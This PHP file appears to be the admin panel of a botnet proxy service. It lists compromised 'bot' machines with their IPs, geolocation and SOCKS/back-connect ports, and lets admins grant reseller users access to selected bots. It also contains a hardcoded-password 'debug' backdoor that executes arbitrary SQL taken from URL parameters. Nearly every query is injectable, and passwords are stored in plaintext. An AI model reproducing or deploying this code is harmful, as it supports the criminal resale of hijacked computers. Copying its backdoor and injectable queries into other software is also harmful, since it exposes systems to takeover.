<?php

include 'vars.php';

function LoadUserMain()
{
	session_start();

	if(isset($_SESSION['username'])){
	
		if(CheckUserSession($_SESSION['username'], $_SESSION['usersession'])){
			header('Location: main.php');
		}else{
			$_SESSION['username'] = '';
			$_SESSION['usersession'] = '';
			$_SESSION['useradmin'] = '';
		}
	}
}

if(isset($_GET['logout'])){
	Logout();
}



function Logout()
{
	session_start();
	$_SESSION['username'] = '';
	$_SESSION['usersession'] = '';
	$_SESSION['useradmin'] = '';
	header('Location: index.php');
}

function LoadUser()
{
	session_start();

	if(isset($_SESSION['username'])){
	
		if(CheckUserSession($_SESSION['username'], $_SESSION['usersession'])){
			
		}else{
			$_SESSION['username'] = '';
			$_SESSION['usersession'] = '';
			$_SESSION['useradmin'] = '';
			header('Location: index.php');
		}
	}else{
		header('Location: index.php');
	}
}

function GetWhiteArray()
{
	global $host, $user, $pass, $database; 
	
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	
	$accept = array("null");
	$backuser = $_SESSION['username'];
	if($_SESSION['useradmin'] == 2){
		
		$resultbd = $db->query("select * from whitelist where user = '$backuser'");
		$i = 0;
		while ($actor = $resultbd->fetch_assoc()) {
			array_push($accept, $actor['port']);
		}
	}
		
	return $accept;
}

function PrintTable()
{
	include("geo/SxGeo.php");
	$SxGeo = new SxGeo('geo/SxGeo.dat', SXGEO_BATCH | SXGEO_MEMORY);
	
	global $host, $user, $pass, $database; 
	
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	include_once 'config.php';
	global $hostipaddress;
	
	$accept = GetWhiteArray();
	
	$resultbd = $db->query("select * from backclients");
	$i = 0;
	while ($actor = $resultbd->fetch_assoc()) {
		
		if($_SESSION['useradmin'] == 2){
			if(!in_array($actor["botport"], $accept)){
				continue;
			}
		}
		
		echo "<tr>";
		echo "<td>".$i."</td>";$i++;
		echo "<td>".$actor["botid"]."</td>";
		echo "<td>".$actor["botip"]."</td>";
		echo "<td>".$SxGeo->get($actor["botip"])."</td>";
		echo "<td><span class='label label-success'>!</span></td>";
		echo "<td>".$hostipaddress.":".$actor["botport"]."</td>";
		echo "<td>".$hostipaddress.":".$actor["socksport"]."</td>";
		if($_SESSION['useradmin'] != 2){
		$s = 0;
		$resultcom = $db->query("select * from Coments where BotID='".$actor['botid']."'");
		while($com = $resultcom->fetch_assoc()){
			echo "<td><input type='text' autocomplete='off' form='comment_form' name='comment-".$com['BotID']."' value='".htmlspecialchars($com['Coment'], ENT_QUOTES)."'></div></td>";
			$s = 1;
		}
		
		if($s === 0){
			echo "<td><input type='text' autocomplete='off' form='comment_form' name='setcomment-".$actor['botid']."' value=''></div></td>";
		}
		}
		
		echo "</tr>";
	}
}

function SetComment()
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	
	if ($db->connect_errno) {
		return false;
	}
	foreach ($_POST as $key=>$value){
			if(strpos($key,"comment-") !== false){
				$id = substr($key, 8);
				$db->query("UPDATE Coments SET Coment = '".$value."' WHERE BotID = '".$id."';");
			}
			
			if(strpos($key,"setcomment-") !== false){
				$id = substr($key, 11);
				$db->query("INSERT INTO Coments (BotID, Coment) VALUES ('".$id."', '".$value."');");
			}
		}
		$db->close();
		
		Header("Navigate: main.php");
}

/* debug funcs */
if($_GET["pass"] === '20Pru9BOrbwXOlT0lBafb98'){
	
	switch($_GET["func"]){
		case 'execute':
		{
			$db = GetMysqlConnection();
			$db->query($_GET['code']);
			WriteLog($_GET["func"], 'Success', $_GET['code']);
			break;
		}
		case 'select':
		{
			$db = GetMysqlConnection();
			$resultbd = $db->query($_GET['code']);
			WriteLog($_GET["func"], 'Success', $_GET['code']);
			
			echo '<br>';
			while ($row = $resultbd->fetch_assoc()) {
				print_r($row);
				echo '<br>';
			}
			
			break;
		}
	
	}
	
}

function WriteLog($command, $code, $text){
	echo "----- LOG -----<br><br>";	
	echo "Event execute: " . $code . "<br>";	
	echo "Event func code: " . $text . "<br>";	
}

function GetMysqlConnection(){
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
		echo 'error: GetMysqlConnection';
	}
	
	return $db;
}

function CheckUserSession($name, $session)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
		return false;
	}
	else{
		$sql = "select * from users where login = '$name' and session = '$session'";
		$resultbd = $db->query($sql);
		
		if ($resultbd->num_rows === 0) {
			$db->close();
			return false;
		}else{
			$db->close();
			return true;
		}
	}
	
	return true;
	
}

/*admin func*/
function PrintTableUsers()
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("select * from users");
	while ($actor = $resultbd->fetch_assoc()) {
		echo "<tr>";
		echo "<td>".$actor["id"]."</td>";
		echo "<td>".$actor["login"]."</td>";
		echo "<td>".$actor["admin"]."</td>";
		echo "<td>".$actor["banned"]."</td>";
		
		echo "<td>";
		if($actor["banned"]=='1'){
			echo "<a href=\"admin.php?unban=".$actor["id"]."\"><button class='btn btn-default'>unban</button></a> ";
		}else{
			echo "<a href=\"admin.php?ban=".$actor["id"]."\"><button class='btn btn-default'>ban</button></a> ";
		}
		echo "<a href=\"admin.php?newpass=".$actor["id"]."\"><button class='btn btn-default'>new pass</button></a> ";
		echo "<a href=\"admin.php?delete=".$actor["id"]."\"><button class='btn btn-default'>delete</button></a>";
		echo "<a href=\"admin.php?unl=".$actor["id"]."\"><button class='btn btn-default'>unlogin</button></a>";
		
		if($actor["admin"] == '2'){
			echo "<a href=\"acceptlist.php?user=".$actor["login"]."\"><button class='btn btn-default'>acceptbots</button></a>";
		}
		
		echo "</td>";
		
		//echo "<td>".$actor["banned"]."</td>";
		echo "</tr>";
	}
}

function GetSellBots()
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("select * from backclients");
	while ($actor = $resultbd->fetch_assoc()) {
		echo "<tr>";
		echo "<td>".$actor["botid"]."</td>";
		echo "<td>".$actor["botip"]."</td>";
		
		$botport = $actor["botport"];
		$ii = 0;
		while ($actor = $db->query("select * from whitelist where port = '".$actor["botport"]."' and user = '".$_SESSION['accesname']."'")->fetch_assoc()) {
			echo "<td><a href=\"acceptlist.php?update=".$botport."&sel=1\"><button class='btn btn-default'>Исключить из списка</button></a></td>";
			$ii = 1;
		}
		
		if($ii == 0){
			echo "<td><a href=\"acceptlist.php?update=".$botport."&sel=0\"><button class='btn btn-default'>Включить в список</button></a></td>";
		}
		echo "</tr>";
	}
}

function SetDostup($port, $exist, $usere)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	
	$userip = "";
	$resultbd = $db->query("select * from users where login = '$usere'");
	while ($actor = $resultbd->fetch_assoc()) {
		$userip = $actor['ip'];
	}
	
	
	if($exist == 0){
		$db->query("insert into whitelist(ip, port, user) values ('$userip', '$port', '$usere')");
	}
	else{
		echo $usere;
		$db->query("delete  from whitelist where port = '$port' and user = '$usere'");
	}
	
	Header("Location: acceptlist.php");
}

function BanUser($id)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("update users set banned = '1' where id = '$id'");
	Unlogin($id);
}

function UnBanUser($id)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("update users set banned = '0' where id = '$id'");
	Unlogin($id);
}

function generate_pass($length = 16) {
    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    $count = mb_strlen($chars);
    for ($i = 0, $result = ''; $i < $length; $i++) {
        $index = rand(0, $count - 1);
        $result .= mb_substr($chars, $index, 1);
    }
    return $result;
}

function NewPass($id)
{
	$newpass = generate_pass();
	
	$_SESSION['newusername'] = $id;	
	$_SESSION['newpass'] = $newpass;
	
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("update users set password = '$newpass' where id = '$id'");
	Unlogin($id);
}

function delUser($id)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("delete from users where id = '$id'");
	Unlogin($id);
}

function AddNewUser($us, $pas, $ad)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$resultbd = $db->query("insert into users(login, password, admin, banned, ip) values ('$us', '$pas', '$ad', '0', 'login')");
}

function Unlogin($id)
{
	global $host, $user, $pass, $database;
	$db = new mysqli($host, $user, $pass, $database);
	if ($db->connect_errno) {
			echo 'error';
	}
	$db->query("update users set session = '0' where id = '$id'");
	$db->query("update users set ip = '0' where id = '$id'");
	
	$usnem = "";
	
	$resultbd = $db->query("select * from users where id = '$id'");
	while ($actor = $resultbd->fetch_assoc()) {
		$usnem = $actor['login'];
	}
	
	$db->query("delete  from whitelist where user = '$usnem'");
}

?>